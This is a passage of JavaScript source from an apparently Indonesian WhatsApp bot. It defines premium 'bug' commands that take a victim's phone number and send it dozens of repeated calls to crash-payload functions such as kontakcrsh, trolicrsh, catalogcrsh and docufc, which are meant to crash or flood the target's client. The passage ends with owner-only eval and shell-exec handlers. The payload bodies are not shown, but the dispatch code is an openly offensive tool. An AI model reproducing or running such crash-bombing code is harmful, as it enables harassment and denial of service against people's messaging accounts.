if (!isPremium) return byxzreply(mess.premium)
if (!q) return byxzreply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return byxzreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await byxzreply(mess.bugrespon)
for (let j = 0; j < 1; j++) {
await voxlocas3(byxz, target)
await kontakcrsh(target, force2)
await voxtrash(byxz, target)
await voxtrash(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await xlocztwo(byxz, target)
await xlocstck(byxz, target)
await xlocui(byxz, target)
await xpokers(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await kontakcrsh(target, force2)
await kontakcrsh(target, force2)
await kontakcrsh(target, force2)
await kontakcrsh(target, force2)
await kontakcrsh(target, force2)
await kontakcrsh(target, force2)
await voxlocas3(byxz, target)
await voxtrash(byxz, target)
await xlocztwo(byxz, target)
await xlocstck(byxz, target)
await xlocui(byxz, target)
await voxlocas3(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await xpokers(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await xpokers(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
}
await byxzreply(mess.bugsuc)
}
break

case 'bugtroli': {
if (!isPremium) return byxzreply(mess.premium)
if (!q) return byxzreply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return byxzreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await byxzreply(mess.bugrespon)
for (let j = 0; j < 1; j++) {
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await voxtrash(byxz, target)
await xpokers(byxz, target)
await voxlocas(byxz, target)
await trolicrsh(target, voxnul)
await trolicrsh(target, voxnul)
await trolicrsh(target, voxnul)
await trolicrsh(target, voxnul)
await trolicrsh(target, voxnul)
await trolicrsh(target, voxnul)
await voxtrash(byxz, target)
await xlocztwo(byxz, target)
await trolicrsh(target, voxnul)
await trolicrsh(target, voxnul)
await xlocstck(byxz, target)
await xlocui(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await voxtrash(byxz, target)
await trolicrsh(target, voxnul)
await voxlocas3(byxz, target)
await trolicrsh(target, voxnul)
await tuxasz(byxz, target)
await trolicrsh(target, voxnul)
await tuxasz(byxz, target)
await trolicrsh(target, voxnul)
await voxtrash(byxz, target)
await trolicrsh(target, voxnul)
await voxlocas3(byxz, target)
await trolicrsh(target, voxnul)
await voxlocas3(byxz, target)
await voxtrash(byxz, target)
await trolicrsh(target, voxnul)
await voxlocas(byxz, target)
await xpokers(byxz, target)
await xlocztwo(byxz, target)
await xlocstck(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await voxtrash(byxz, target)
await xlocui(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await xpokers(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxtrash(byxz, target)
await voxtrash(byxz, target)
}
await byxzreply(mess.bugsuc)
}
break

case 'bugcatalog': {
if (!isPremium) return byxzreply(mess.premium)
if (!q) return byxzreply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return byxzreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await byxzreply(mess.bugrespon)
for (let j = 0; j < 1; j++) {
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await voxlocas3(byxz, target)
await catalogcrsh(target, voxnul)
await catalogcrsh(target, voxnul)
await catalogcrsh(target, voxnul)
await voxlocas3(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await xpokers(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await xpokers(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await xpokers(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxtrash(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxtrash(byxz, target)
await voxtrash(byxz, target)
}
await byxzreply(mess.bugsuc)
}
break

case 'bugdoku': {
if (!isPremium) return byxzreply(mess.premium)
if (!q) return byxzreply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return byxzreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await byxzreply(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await voxtrash(byxz, target)
await xlocztwo(byxz, target)
await xlocstck(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await xlocui(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await docufc(target)
await docufc(target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await xpokers(byxz, target)
await xlocztwo(byxz, target)
await xlocstck(byxz, target)
await xlocui(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await xpokers(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await xpokers(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxtrash(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await xpokers(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await xpokers(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxtrash(byxz, target)
}
await byxzreply(mess.bugsuc)
}
break
//=================================================//

default:
if (budy.startsWith('=>')) {
if (!isDeveloper) return byxzreply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return byxzreply(bang)
}
try {
byxzreply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
byxzreply(String(e))
}
}
//=================================================//
if (budy.startsWith('>')) {
if (!isDeveloper) return byxzreply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await byxzreply(evaled)
} catch (err) {
await byxzreply(String(err))
}
}
//=================================================//
if (budy.startsWith('$')) {
if (!isDeveloper) return byxzreply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if (err) return byxzreply(`${err}`)
if (stdout) return byxzreply(`${stdout}`)
})
}
}
} catch (err) {
peki = async () => {
byxz.sendMessage(global.ownMain + '@s.whatsapp.net', {text: require('util').format(err)}, {quoted: m})
await sleep(1000)
m.reply(`
❌ Eror Ditemukan. Eror Succes Dilaporkan Ke Contributor Bot, Mohon Tunggu Beberapa Waktu Sampai Owner Memperbaiki Eror Tersebut ✅

${util.format(err)}`)
console.log(util.format(err))
}
peki()
}
}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
